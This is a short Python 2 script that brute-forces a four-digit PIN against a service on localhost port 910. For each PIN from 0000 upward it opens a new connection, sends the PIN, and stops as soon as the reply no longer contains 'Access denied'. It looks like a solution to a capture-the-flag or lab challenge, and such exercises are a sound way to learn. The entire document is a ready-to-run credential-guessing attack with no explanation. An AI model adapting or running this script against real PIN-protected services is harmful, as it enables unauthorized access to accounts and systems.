import socket
import sys

print"============"
for i in range(0000, 9999):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(('localhost', 910))
	sock.recv(4096)
	print str(i).zfill(4)
	pin = str(i).zfill(4) + '\n'
	print "Pin - " + pin 
	sock.send(pin.encode())
	reply = (sock.recv(4096))
	if "Access denied, disconnecting client" not in reply:
		break

sock.close()
